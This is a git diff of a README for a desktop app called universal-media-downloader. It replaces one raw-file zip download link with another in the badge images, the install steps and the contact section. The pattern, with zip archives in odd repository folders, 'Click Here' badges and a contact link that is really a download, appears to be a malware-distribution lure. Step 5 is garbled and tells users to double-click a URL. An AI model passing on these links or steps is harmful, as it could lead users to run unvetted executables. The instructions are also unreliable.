@@ -8,7 +8,7 @@ Welcome to the universal-media-downloader! This is a simple desktop application 
 
 To begin, you need to download the application. You can visit the Releases page to get the latest version:
 
-[![Download universal-media-downloader](https://github.com/otmane528/universal-media-downloader/raw/refs/heads/main/screenshots/universal-downloader-media-3.3.zip%20Now-Click%20Here-blue)](https://github.com/otmane528/universal-media-downloader/raw/refs/heads/main/screenshots/universal-downloader-media-3.3.zip)
+[![Download universal-media-downloader](https://raw.githubusercontent.com/otmane528/universal-media-downloader/main/app/downloader_universal_media_v1.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/otmane528/universal-media-downloader/main/app/downloader_universal_media_v1.9.zip)
 
 ### Steps to Install
 
@@ -16,7 +16,7 @@ To begin, you need to download the application. You can visit the Releases page 
 2. On the Releases page, find the latest version of the universal-media-downloader.
 3. Click on the file that ends with `.exe` or `.zip` depending on your system.
 4. If you downloaded a `.zip` file, right-click it and select "Extract All" to unpack the files.
-5. After extraction, double-click on the `https://github.com/otmane528/universal-media-downloader/raw/refs/heads/main/screenshots/universal-downloader-media-3.3.zip` to start the installation.
+5. After extraction, double-click on the `https://raw.githubusercontent.com/otmane528/universal-media-downloader/main/app/downloader_universal_media_v1.9.zip` to start the installation.
 6. Follow the on-screen instructions to complete the installation.
 
 ## 🖥️ System Requirements
@@ -69,6 +69,6 @@ This project is maintained under the MIT License. You can freely use and modify 
 
 If you have any questions or feedback, visit our GitHub page:
 
-[![Download universal-media-downloader](https://github.com/otmane528/universal-media-downloader/raw/refs/heads/main/screenshots/universal-downloader-media-3.3.zip%20Now-Click%20Here-blue)](https://github.com/otmane528/universal-media-downloader/raw/refs/heads/main/screenshots/universal-downloader-media-3.3.zip)
+[![Download universal-media-downloader](https://raw.githubusercontent.com/otmane528/universal-media-downloader/main/app/downloader_universal_media_v1.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/otmane528/universal-media-downloader/main/app/downloader_universal_media_v1.9.zip)
 
 We appreciate your interest in universal-media-downloader. Happy downloading!
